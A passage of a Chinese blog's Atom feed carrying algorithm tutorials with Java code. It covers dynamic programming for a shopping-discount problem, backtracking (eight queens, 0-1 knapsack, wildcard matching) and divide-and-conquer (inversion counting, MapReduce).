class="line">      <span class="keyword">if</span> (states[i-<span class="number">1</span>][j] == <span class="keyword">true</span>) states[i][j] = states[i-<span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">3</span>*w-items[i]; ++j) &#123;<span class="comment">//购买第i个商品</span></span><br><span class="line">      <span class="keyword">if</span> (states[i-<span class="number">1</span>][j]==<span class="keyword">true</span>) states[i][j+items[i]] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">  <span class="keyword">for</span> (j = w; j &lt; <span class="number">3</span>*w+<span class="number">1</span>; ++j) &#123; </span><br><span class="line">    <span class="keyword">if</span> (states[n-<span class="number">1</span>][j] == <span class="keyword">true</span>) <span class="keyword">break</span>; <span class="comment">// 输出结果大于等于w的最小值</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (j == <span class="number">3</span>*w+<span class="number">1</span>) <span class="keyword">return</span>; <span class="comment">// 没有可行解</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = n-<span class="number">1</span>; i &gt;= <span class="number">1</span>; --i) &#123; <span class="comment">// i表示二维数组中的行，j表示列</span></span><br><span class="line">    <span class="keyword">if</span>(j-items[i] &gt;= <span class="number">0</span> &amp;&amp; states[i-<span class="number">1</span>][j-items[i]] == <span class="keyword">true</span>) &#123;</span><br><span class="line">      System.out.print(items[i] + <span class="string">&quot; &quot;</span>); <span class="comment">// 购买这个商品</span></span><br><span class="line">      j = j - items[i];</span><br><span class="line">    &#125; <span class="comment">// else 没有购买这个商品，j不变。</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (j != <span class="number">0</span>) System.out.print(items[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释下代码中如何打印选择购买的商品的：</p><p>状态 (i, j) 只有可能从 (i-1, j) 或者 (i-1, j-value[i]) 两个状态推导过来。所以，我们就检查这两个状态是否是可达的，也就是 states[i-1][j]或者 states[i-1][j-value[i]]是否是 true。</p><p>如果 states[i-1][j]可达，就说明我们没有选择购买第 i 个商品，如果 states[i-1][j-value[i]]可达，那就说明我们选择了购买第 i 个商品。我们从中选择一个可达的状态（如果两个都可达，就随意选择一个），然后，继续迭代地考察其他商品是否有选择购买。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/09/06/W1iAxbGIe42PtRs.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;淘宝的“双十一”购物节有各种促销活动，比如“满 200 元减 50 元”。如何从 n 个商品中抉择出方案使得商品价格总和最大程度接近满减条件（200元）?&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>回溯算法</title>
    <link href="https://speedpromise.github.io/archives/376d0826.html"/>
    <id>https://speedpromise.github.io/archives/376d0826.html</id>
    <published>2021-09-02T05:23:27.000Z</published>
    <updated>2021-10-28T12:46:14.440Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/09/02/FrjA7iKm9pH5vGX.jpg" style="zoom: 50%;" /><p>深度优先搜索算法利用的是回溯算法思想。除此之外，很多经典的数学问题都可以用回溯算法解决，比如数独、八皇后、0-1 背包、图的着色、旅行商问题、全排列等等。</p><span id="more"></span><h3 id="如何理解“回溯算法”？"><a href="#如何理解“回溯算法”？" class="headerlink" title="如何理解“回溯算法”？"></a>如何理解“回溯算法”？</h3><p>回溯的处理思想，有点类似枚举搜索。我们枚举所有的解，找到满足期望的解。为了有规律地枚举所有可能的解，避免遗漏和重复，我们把问题求解的过程分为多个阶段。每个阶段，我们都会面对一个岔路口，我们先随意选一条路走，当发现这条路走不通的时候（不符合期望的解），就回退到上一个岔路口，另选一种走法继续走。</p><p>还是看几个经典的例子，增强理解：</p><h3 id="八皇后问题"><a href="#八皇后问题" class="headerlink" title="八皇后问题"></a>八皇后问题</h3><p>有一个 8x8 的棋盘，希望往里放 8 个棋子（皇后），每个棋子所在的行、列、对角线都不能有另一个棋子。第一幅图是满足条件的一种方法，第二幅图是不满足条件的。八皇后问题就是期望找到所有满足这种要求的放棋子方式。</p><img data-src="https://i.loli.net/2021/09/02/ejCzlPhv4HitT9R.jpg" style="zoom:50%;" /><p>我们把这个问题划分成 8 个阶段，依次将 8 个棋子放到第一行、第二行、第三行……第八行。在放置的过程中，我们不停地检查当前放法，是否满足要求。如果满足，则跳到下一行继续放置棋子；如果不满足，那就再换一种放法，继续尝试。</p><p>回溯算法非常适合用递归算法实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">8</span>];<span class="comment">//全局或成员变量,下标表示行,值表示queen存储在哪一列</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cal8queens</span><span class="params">(<span class="keyword">int</span> row)</span> </span>&#123; <span class="comment">// 调用方式：cal8queens(0);</span></span><br><span class="line">  <span class="keyword">if</span> (row == <span class="number">8</span>) &#123; <span class="comment">// 8个棋子都放置好了，打印结果</span></span><br><span class="line">    printQueens(result);</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// 8行棋子都放好了，已经没法再往下递归了，所以就return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> column = <span class="number">0</span>; column &lt; <span class="number">8</span>; ++column) &#123; <span class="comment">// 每一行都有8中放法</span></span><br><span class="line">    <span class="keyword">if</span> (isOk(row, column)) &#123; <span class="comment">// 有些放法不满足要求</span></span><br><span class="line">      result[row] = column; <span class="comment">// 第row行的棋子放到了column列</span></span><br><span class="line">      cal8queens(row+<span class="number">1</span>); <span class="comment">// 考察下一行</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isOk</span><span class="params">(<span class="keyword">int</span> row, <span class="keyword">int</span> column)</span> </span>&#123;<span class="comment">//判断row行column列放置是否合适</span></span><br><span class="line">  <span class="keyword">int</span> leftup = column - <span class="number">1</span>, rightup = column + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = row-<span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123; <span class="comment">// 逐行往上考察每一行</span></span><br><span class="line">    <span class="keyword">if</span> (result[i] == column) <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// 第i行的column列有棋子吗？</span></span><br><span class="line">    <span class="keyword">if</span> (leftup &gt;= <span class="number">0</span>) &#123; <span class="comment">// 考察左上对角线：第i行leftup列有棋子吗？</span></span><br><span class="line">      <span class="keyword">if</span> (result[i] == leftup) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (rightup &lt; <span class="number">8</span>) &#123; <span class="comment">// 考察右上对角线：第i行rightup列有棋子吗？</span></span><br><span class="line">      <span class="keyword">if</span> (result[i] == rightup) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    --leftup; ++rightup;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printQueens</span><span class="params">(<span class="keyword">int</span>[] result)</span> </span>&#123; <span class="comment">// 打印出一个二维矩阵</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> row = <span class="number">0</span>; row &lt; <span class="number">8</span>; ++row) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> column = <span class="number">0</span>; column &lt; <span class="number">8</span>; ++column) &#123;</span><br><span class="line">      <span class="keyword">if</span> (result[row] == column) System.out.print(<span class="string">&quot;Q &quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> System.out.print(<span class="string">&quot;* &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">  &#125;</span><br><span class="line">  System.out.println();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0-1-背包"><a href="#0-1-背包" class="headerlink" title="0-1 背包"></a>0-1 背包</h3><p>我们有一个背包，背包总的承载重量是 Wkg。现在我们有 n 个物品，每个物品的重量不等，并且不可分割。我们现在期望选择几件物品，装载到背包中。在不超过背包所能装载重量的前提下，如何让背包中物品的总重量最大？</p><p>对于每个物品来说，都有两种选择，装进背包或者不装进背包。对于 n 个物品来说，总的装法就有 2^n 种，去掉总重量超过 Wkg 的，从剩下的装法中选择总重量最接近 Wkg 的。</p><p>用回溯的方法，我们可以把物品依次排列，整个问题就分解为了 n 个阶段，每个阶段对应一个物品怎么选择。先对第一个物品进行处理，选择装进去或者不装进去，然后再递归地处理剩下的物品。</p><p>这里还稍微用到了一点搜索剪枝的技巧，就是当发现已经选择的物品的重量超过 Wkg 之后，我们就停止继续探测剩下的物品。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> maxW = Integer.MIN_VALUE; <span class="comment">//存储背包中物品总重量的最大值</span></span><br><span class="line"><span class="comment">// cw表示当前已经装进去的物品的重量和；i表示考察到哪个物品了；</span></span><br><span class="line"><span class="comment">// w背包重量；items表示每个物品的重量；n表示物品个数</span></span><br><span class="line"><span class="comment">// 假设背包可承受重量100，物品个数10，物品重量存储在数组a中，那可以这样调用函数：</span></span><br><span class="line"><span class="comment">// f(0, 0, a, 10, 100)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> cw, <span class="keyword">int</span>[] items, <span class="keyword">int</span> n, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (cw == w || i == n) &#123; <span class="comment">// cw==w表示装满了;i==n表示已经考察完所有的物品</span></span><br><span class="line">    <span class="keyword">if</span> (cw &gt; maxW) maxW = cw;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  f(i+<span class="number">1</span>, cw, items, n, w);</span><br><span class="line">  <span class="keyword">if</span> (cw + items[i] &lt;= w) &#123;<span class="comment">// 已经超过可以背包承受的重量的时候，就不要再装了</span></span><br><span class="line">    f(i+<span class="number">1</span>,cw + items[i], items, n, w);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>为了方便讲解，我假设正则表达式中只包含“*”和“?”这两种通配符，并且对这两个通配符的语义稍微做些改变，其中，“*”匹配任意多个（大于等于 0 个）任意字符，“?”匹配零个或者一个任意字符。基于以上背景假设，我们看下，如何用回溯算法，判断一个给定的文本，能否跟给定的正则表达式匹配？</p><p>依次考察正则表达式中的每个字符，当是非通配符时，我们就直接跟文本的字符进行匹配，如果相同，则继续往下处理；如果不同，则回溯。当遇到特殊字符的时候，我们就有多种处理方式了，也就是所谓的岔路口，比如“*”有多种匹配方案，可以匹配任意个文本串中的字符，我们就先随意的选择一种匹配方案，然后继续考察剩下的字符。如果中途发现无法继续匹配下去了，我们就回到这个岔路口，重新选择一种匹配方案，然后再继续匹配剩下的字符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Pattern</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">boolean</span> matched = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">char</span>[] pattern; <span class="comment">// 正则表达式</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> plen; <span class="comment">// 正则表达式长度</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Pattern</span><span class="params">(<span class="keyword">char</span>[] pattern, <span class="keyword">int</span> plen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.pattern = pattern;</span><br><span class="line">    <span class="keyword">this</span>.plen = plen;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">match</span><span class="params">(<span class="keyword">char</span>[] text, <span class="keyword">int</span> tlen)</span> </span>&#123; <span class="comment">// 文本串及长度</span></span><br><span class="line">    matched = <span class="keyword">false</span>;</span><br><span class="line">    rmatch(<span class="number">0</span>, <span class="number">0</span>, text, tlen);</span><br><span class="line">    <span class="keyword">return</span> matched;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">rmatch</span><span class="params">(<span class="keyword">int</span> ti, <span class="keyword">int</span> pj, <span class="keyword">char</span>[] text, <span class="keyword">int</span> tlen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (matched) <span class="keyword">return</span>; <span class="comment">// 如果已经匹配了，就不要继续递归了</span></span><br><span class="line">    <span class="keyword">if</span> (pj == plen) &#123; <span class="comment">// 正则表达式到结尾了</span></span><br><span class="line">      <span class="keyword">if</span> (ti == tlen) matched = <span class="keyword">true</span>; <span class="comment">// 文本串也到结尾了</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pattern[pj] == <span class="string">&#x27;*&#x27;</span>) &#123; <span class="comment">// *匹配任意个字符</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= tlen-ti; ++k) &#123;</span><br><span class="line">        rmatch(ti+k, pj+<span class="number">1</span>, text, tlen);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern[pj] == <span class="string">&#x27;?&#x27;</span>) &#123; <span class="comment">// ?匹配0个或者1个字符</span></span><br><span class="line">      rmatch(ti, pj+<span class="number">1</span>, text, tlen);</span><br><span class="line">      rmatch(ti+<span class="number">1</span>, pj+<span class="number">1</span>, text, tlen);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ti &lt; tlen &amp;&amp; pattern[pj] == text[ti]) &#123; <span class="comment">// 纯字符匹配才行</span></span><br><span class="line">      rmatch(ti+<span class="number">1</span>, pj+<span class="number">1</span>, text, tlen);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/09/02/FrjA7iKm9pH5vGX.jpg&quot; style=&quot;zoom: 50%;&quot; /&gt;

&lt;p&gt;深度优先搜索算法利用的是回溯算法思想。除此之外，很多经典的数学问题都可以用回溯算法解决，比如数独、八皇后、0-1 背包、图的着色、旅行商问题、全排列等等。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>分治算法</title>
    <link href="https://speedpromise.github.io/archives/7474c898.html"/>
    <id>https://speedpromise.github.io/archives/7474c898.html</id>
    <published>2021-09-01T02:13:50.000Z</published>
    <updated>2021-10-28T12:46:14.428Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/09/01/FGtVSwuW4oCkJ6X.jpg" style="zoom:50%;" /><p>MapReduce 是 Google 大数据处理的三驾马车之一，另外两个是 GFS 和 Bigtable。它在倒排索引、PageRank 计算、网页分析等搜索引擎相关的技术中都有大量的应用。尽管开发一个 MapReduce 看起来很高深，感觉跟我们遥不可及。实际上，万变不离其宗，它的本质就是我们今天要学的这种算法思想，分治算法。</p><span id="more"></span><h3 id="如何理解分治算法？"><a href="#如何理解分治算法？" class="headerlink" title="如何理解分治算法？"></a>如何理解分治算法？</h3><p>分治算法（divide and conquer）的核心思想其实就是四个字，分而治之 ，也就是将原问题划分成 n 个规模较小，并且结构与原问题相似的子问题，递归地解决这些子问题，然后再合并其结果，就得到原问题的解。</p><p><strong>分治算法是一种处理问题的思想，递归是一种编程技巧。</strong>实际上，分治算法一般都比较适合用递归来实现。分治算法的递归实现中，每一层递归都会涉及这样三个操作：</p><ul><li>分解：将原问题分解成一系列子问题；</li><li>解决：递归地求解各个子问题，若子问题足够小，则直接求解；</li><li>合并：将子问题的结果合并成原问题。</li></ul><p>分治算法能解决的问题，一般需要满足下面这几个条件：</p><ul><li>原问题与分解成的小问题具有相同的模式；</li><li>原问题分解成的子问题可以独立求解，子问题之间没有相关性，这一点是分治算法跟动态规划的明显区别，等我们讲到动态规划的时候，会详细对比这两种算法；</li><li>具有分解终止条件，也就是说，当问题足够小时，可以直接求解；</li><li>可以将子问题合并成原问题，而这个合并操作的复杂度不能太高，否则就起不到减小算法总体复杂度的效果了。</li></ul><h3 id="分治算法应用举例分析"><a href="#分治算法应用举例分析" class="headerlink" title="分治算法应用举例分析"></a>分治算法应用举例分析</h3><p>假设我们有 n 个数据，我们期望数据从小到大排列，那完全有序的数据的有序度就是 n(n-1)/2，逆序度等于 0；相反，倒序排列的数据的有序度就是 0，逆序度是 n(n-1)/2。除了这两种极端情况外，我们通过计算有序对或者逆序对的个数，来表示数据的有序度或逆序度。</p><img data-src="https://i.loli.net/2021/09/01/KeSPqbwpETat1FD.jpg" style="zoom:50%;" /><p><strong>如何编程求出一组数据的有序对个数或者逆序对个数呢？</strong></p><p>最笨的方法是，拿每个数字跟它后面的数字比较，看有几个比它小的。我们把比它小的数字个数记作 k，通过这样的方式，把每个数字都考察一遍之后，然后对每个数字对应的 k 值求和，最后得到的总和就是逆序对个数。不过，这样操作的时间复杂度是 O(n^2)。那有没有更加高效的处理方法呢？</p><p>我们套用分治的思想来求数组 A 的逆序对个数。我们可以将数组分成前后两半 A1 和 A2，分别计算 A1 和 A2 的逆序对个数 K1 和 K2，然后再计算 A1 与 A2 之间的逆序对个数 K3。那数组 A 的逆序对个数就等于 K1+K2+K3。</p><p>使用分治算法其中一个要求是，子问题合并的代价不能太大，否则就起不了降低时间复杂度的效果了。那回到这个问题，如何快速计算出两个子问题 A1 与 A2 之间的逆序对个数呢？</p><p>这里就要借助归并排序算法了。归并排序中有一个非常关键的操作，就是将两个有序的小数组，合并成一个有序的数组。实际上，在这个合并的过程中，我们就可以计算这两个小数组的逆序对个数了。每次合并操作，我们都计算逆序对个数，把这些计算出来的逆序对个数求和，就是这个数组的逆序对个数了。</p><img data-src="https://i.loli.net/2021/09/01/MnFv139ZwjAOYIt.jpg" style="zoom: 50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> num = <span class="number">0</span>; <span class="comment">// 全局变量或者成员变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  mergeSortCounting(a, <span class="number">0</span>, n-<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">mergeSortCounting</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> p, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (p &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">int</span> q = (p+r)/<span class="number">2</span>;</span><br><span class="line">  mergeSortCounting(a, p, q);</span><br><span class="line">  mergeSortCounting(a, q+<span class="number">1</span>, r);</span><br><span class="line">  merge(a, p, q, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> p, <span class="keyword">int</span> q, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i = p, j = q+<span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span>[] tmp = <span class="keyword">new</span> <span class="keyword">int</span>[r-p+<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">while</span> (i&lt;=q &amp;&amp; j&lt;=r) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt;= a[j]) &#123;</span><br><span class="line">      tmp[k++] = a[i++];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      num += (q-i+<span class="number">1</span>); <span class="comment">// 统计p-q之间，比a[j]大的元素个数</span></span><br><span class="line">      tmp[k++] = a[j++];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= q) &#123; <span class="comment">// 处理剩下的</span></span><br><span class="line">    tmp[k++] = a[i++];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (j &lt;= r) &#123; <span class="comment">// 处理剩下的</span></span><br><span class="line">    tmp[k++] = a[j++];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= r-p; ++i) &#123; <span class="comment">// 从tmp拷贝回a</span></span><br><span class="line">    a[p+i] = tmp[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于分治算法，还有几道比较经典的问题。</p><ul><li><p>二维平面上有 n 个点，如何快速计算出两个距离最近的点对？</p></li><li><p>有两个 n<em>n 的矩阵 A，B，如何快速求解两个矩阵的乘积 C=A</em>B？</p></li></ul><h3 id="分治思想在海量数据处理中的应用"><a href="#分治思想在海量数据处理中的应用" class="headerlink" title="分治思想在海量数据处理中的应用"></a>分治思想在海量数据处理中的应用</h3><p>比如，给 10GB 的订单文件按照金额排序这样一个需求，看似是一个简单的排序问题，但是因为数据量大，有 10GB，而我们的机器的内存可能只有 2、3GB 这样子，无法一次性加载到内存，也就无法通过单纯地使用快排、归并等基础算法来解决了。在此就可以利用分治的思想。</p><p>给 10GB 的订单排序，我们就可以先扫描一遍订单，根据订单的金额，将 10GB 的文件划分为几个金额区间。比如订单金额为 1 到 100 元的放到一个小文件，101 到 200 之间的放到另一个文件，以此类推。这样每个小文件都可以单独加载到内存排序，最后将这些有序的小文件合并，就是最终有序的 10GB 订单数据了。</p><p>如果订单数据存储在类似 GFS 这样的分布式系统上，当 10GB 的订单被划分成多个小文件的时候，每个文件可以并行加载到多台机器上处理，最后再将结果合并在一起，这样并行处理的速度也加快了很多。不过，这里有一个点要注意，就是数据的存储与计算所在的机器是同一个或者在网络中靠的很近（比如一个局域网内，数据存取速度很快），否则就会因为数据访问的速度，导致整个处理过程不但不会变快，反而有可能变慢。</p><h3 id="解答开篇"><a href="#解答开篇" class="headerlink" title="解答开篇"></a>解答开篇</h3><p>为什么说 MapReduce 的本质就是分治思想？</p><p>刚刚举的订单的例子，数据有 10GB 大小，可能给你的感受还不强烈。那如果我们要处理的数据是 1T、10T、100T 这样子的，那一台机器处理的效率肯定是非常低的。而对于谷歌搜索引擎来说，网页爬取、清洗、分析、分词、计算权重、倒排索引等等各个环节中，都会面对如此海量的数据（比如网页）。所以，利用集群并行处理显然是大势所趋。</p><p>一台机器过于低效，那我们就把任务拆分到多台机器上来处理。如果拆分之后的小任务之间互不干扰，独立计算，最后再将结果合并。这不就是分治思想吗？</p><p>实际上，MapReduce 框架只是一个任务调度器，底层依赖 GFS 来存储数据，依赖 Borg 管理机器。它从 GFS 中拿数据，交给 Borg 中的机器执行，并且时刻监控机器执行的进度，一旦出现机器宕机、进度卡壳等，就重新从 Borg 中调度一台机器执行。</p><p>尽管 MapReduce 的模型非常简单，但是在 Google 内部应用非常广泛。它除了可以用来处理这种数据与数据之间存在关系的任务，比如 MapReduce 的经典例子，统计文件中单词出现的频率。除此之外，它还可以用来处理数据与数据之间没有关系的任务，比如对网页分析、分词等，每个网页可以独立的分析、分词，而这两个网页之间并没有关系。网页几十亿、上百亿，如果单机处理，效率低下，我们就可以利用 MapReduce 提供的高可靠、高性能、高容错的并行计算框架，并行地处理这几十亿、上百亿的网页。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/09/01/FGtVSwuW4oCkJ6X.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;MapReduce 是 Google 大数据处理的三驾马车之一，另外两个是 GFS 和 Bigtable。它在倒排索引、PageRank 计算、网页分析等搜索引擎相关的技术中都有大量的应用。尽管开发一个 MapReduce 看起来很高深，感觉跟我们遥不可及。实际上，万变不离其宗，它的本质就是我们今天要学的这种算法思想，分治算法。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>贪心算法</title>
    <link href="https://speedpromise.github.io/archives/a4ce31d2.html"/>
    <id>https://speedpromise.github.io/archives/a4ce31d2.html</id>
    <published>2021-08-31T02:09:39.000Z</published>
    <updated>2021-10-28T12:46:14.449Z</updated>
    
